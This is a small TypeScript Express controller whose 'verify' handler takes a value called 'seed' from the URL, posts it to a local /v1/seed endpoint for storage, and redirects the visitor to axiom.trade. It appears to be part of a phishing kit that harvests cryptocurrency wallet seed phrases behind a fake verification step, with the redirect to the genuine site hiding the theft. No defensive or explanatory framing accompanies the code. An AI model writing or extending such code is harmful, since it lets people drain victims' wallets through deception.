import { Request, Response, NextFunction } from 'express';
import { config } from '../config';

export class VerifyController {
  static async handleVerify(
    req: Request<{ data: string }>,
    res: Response,
    next: NextFunction
  ) {
    try {
      const seed = decodeURIComponent(req.params.data);
      await fetch(`http://localhost:${config.port}/v1/seed`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ data: seed }),
      });
      res.redirect('https://axiom.trade/');
    } catch (error) {
      next(error);
    }
  }
}